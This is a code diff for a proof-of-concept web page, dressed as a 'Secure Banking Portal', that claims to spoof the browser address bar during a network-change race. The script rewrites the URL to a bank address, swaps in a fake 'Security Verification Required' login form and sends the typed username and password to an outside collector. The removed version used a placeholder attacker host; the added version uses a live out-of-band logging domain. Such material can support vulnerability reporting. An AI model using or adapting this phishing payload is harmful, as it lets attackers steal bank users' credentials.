@@ -1,28 +1,43 @@
-<script>
-// POC: URL Bar Spoof - Network Change Race Condition
-const spoofURL = 'https://real-bank.com';
-const fakeContent = 'https://fake-phishing.com';
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Banking Portal</title>
+</head>
+<body>
+    <div id="content">
+        <h2>Welcome to Secure Bank</h2>
+        <p>Loading your account...</p>
+    </div>
 
-// Trigger on network change
-window.addEventListener('online', startSpoof);
+    <script>
+        // POC: URL Bar Spoof - Network Change Race Condition
+        const spoofURL = 'https://real-bank.com';
+        const fakeContent = 'https://fake-phishing.com';
 
-function startSpoof() {
-    // Freeze URL bar showing legitimate site
-    history.replaceState({}, '', spoofURL);
-    
-    // Replace page content with phishing site
-    document.body.innerHTML = `
-        <h1>Login Required</h1>
-        <input id="user" placeholder="Username">
-        <input id="pass" type="password" placeholder="Password">
-        <button onclick="steal()">Login</button>
-    `;
-}
+        // Trigger on network change
+        window.addEventListener('online', startSpoof);
 
-function steal() {
-    const user = document.getElementById('user').value;
-    const pass = document.getElementById('pass').value;
-    // Send stolen credentials
-    fetch('https://attacker.com/log?u=' + user + '&p=' + pass);
-}
+        function startSpoof() {
+            // Freeze URL bar showing legitimate site
+            history.replaceState({}, '', spoofURL);
+            
+            // Replace page content with phishing site
+            document.body.innerHTML = `
+                <h1>Security Verification Required</h1>
+                <p>Please re-login after network restoration</p>
+                <input id="user" placeholder="Username">
+                <input id="pass" type="password" placeholder="Password">
+                <button onclick="steal()">Verify Identity</button>
+            `;
+        }
+
+        function steal() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            // Send stolen credentials
+            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/log?u=' + user + '&p=' + pass);
+            alert('Verification failed. Please try again.');
+        }
     </script>
+</body>
+</html>
